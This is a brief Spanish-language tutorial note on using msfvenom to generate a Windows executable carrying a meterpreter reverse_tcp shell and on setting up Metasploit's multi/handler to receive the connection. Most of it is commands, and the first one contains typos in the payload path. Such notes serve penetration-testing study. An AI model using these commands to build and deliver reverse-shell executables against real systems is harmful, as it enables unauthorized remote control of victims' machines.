Herramienta para generar nuestros propios Payloads para realizar intrusiones a los servicios de forma distinta

MSFVENOM forma parte de metasploit y viene integrada en KALI



Genera archivos maliciosos


## forma de ejecutar

```sh title:"msfvenom, execute"
 msfvenom -p windows /x64/meterpleeter/reverse_tcp LHOST={IP} LPORT={puerto del reverse} -f exe -o pwned.exe

# esto genera un fichero pwned.exe que contiene uan reverse shell para windows
```



## multihandler

Esto es una alternativa a NetCat (NC) para recibir una cconexion remota
Es una herramienta para la explotacion del payload creado con MSFVENOM

 en metasploit podemos usar multihandler

```sh title:"metasploit user multi handler"
 msfv > use /multi/handler
# 
```

Debemos configurar de la misma forma que hemos configurado el Payload creado con MSFVENOM
```sh title:"metasploit user multi handler set payload"
 msfv > set PAYLOAD windows/x64/meterpreter/reverse_tcp
# 
```